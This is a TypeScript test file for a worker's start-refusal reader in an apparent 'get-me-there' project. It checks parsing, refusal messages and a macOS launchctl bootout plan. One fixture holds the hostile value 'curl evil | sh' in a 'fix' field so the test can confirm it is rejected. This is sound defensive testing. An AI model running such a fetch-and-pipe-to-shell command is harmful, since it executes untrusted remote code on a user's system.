import { join } from 'node:path/posix';
import { START_REFUSAL_REASONS, START_REFUSAL_TEXT, startRefusalSchema } from '@gmt/core';
import { describe, expect, it } from 'vitest';
import { MemoryFs } from '../../src/exec/memory.js';
import { currentPlatform } from '../../src/platform/current.js';
import { bootOutRefused, readStartRefusal, refusalLine } from '../../src/worker/refusal.js';

function home(file?: string) {
  const p = currentPlatform({ platform: 'darwin', arch: 'arm64', uid: 501, env: { HOME: '/Users/op' } });
  const fs = new MemoryFs();
  if (file !== undefined) fs.file(join(p.paths.workerData, 'start-refusal.json'), file);
  return { ...p, fs };
}
const LABEL = 'local.get-me-there.camoufox-worker';

describe('the worker’s refusal file (spec §13; brief §5 worker/refusal.ts)', () => {
  it('none when there is no file', async () => {
    const h = home();
    expect(readStartRefusal(h.paths, h.fs)).toBe('none');
  });
  it('unreadable when the file exists but cannot be read (EACCES; ca-b1-009)', () => {
    const h = home('{}');
    h.fs.unreadable(join(h.paths.workerData, 'start-refusal.json'));
    expect(readStartRefusal(h.paths, h.fs)).toBe('unreadable');
  });
  it.each(START_REFUSAL_REASONS)('reads %s and prints it through START_REFUSAL_TEXT', async (reason) => {
    const h = home(JSON.stringify({ reason, at: '2026-10-24T08:00:00.000Z' }));
    const r = readStartRefusal(h.paths, h.fs);
    expect(r).toEqual({ reason, at: '2026-10-24T08:00:00.000Z' });
    if (r !== 'none' && r !== 'unreadable')
      expect(refusalLine(r)).toBe(`refused, not retrying: ${START_REFUSAL_TEXT[reason].summary}`);
  });
  it.each([
    [
      'a hostile fix field',
      JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
    ],
    ['an unknown reason', JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z' })],
    ['not JSON', '{'],
  ])('%s is unreadable, and nothing from it is used', async (_n, text) => {
    const h = home(text);
    expect(readStartRefusal(h.paths, h.fs)).toBe('unreadable');
  });

  it('bootOutRefused plans the bootout on macOS only when the worker agent is loaded and a refusal is present', () => {
    const p = home();
    const loaded = new Map([[LABEL, { onDisk: 'x', loaded: true, state: 'running' as const }]]);
    const r = startRefusalSchema.parse({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' });
    const a = bootOutRefused(p, loaded, r);
    expect(a.map((x) => (x.kind === 'run' ? x.argv.join(' ') : x.kind))).toEqual([
      `launchctl bootout gui/501/${LABEL}`,
      'waitGone',
    ]);
    expect(bootOutRefused(p, loaded, 'none')).toEqual([]);
    expect(bootOutRefused(p, loaded, 'unreadable')).toEqual([]);
    expect(bootOutRefused(p, new Map(), r)).toEqual([]);
    const linux = currentPlatform({ platform: 'linux', arch: 'x64', uid: 1000, env: { HOME: '/home/a' } });
    expect(
      bootOutRefused(
        linux,
        new Map([
          ['get-me-there-camoufox-worker.service', { onDisk: 'x', loaded: true, state: 'failed' as const }],
        ]),
        r,
      ),
    ).toEqual([]);
  });
});
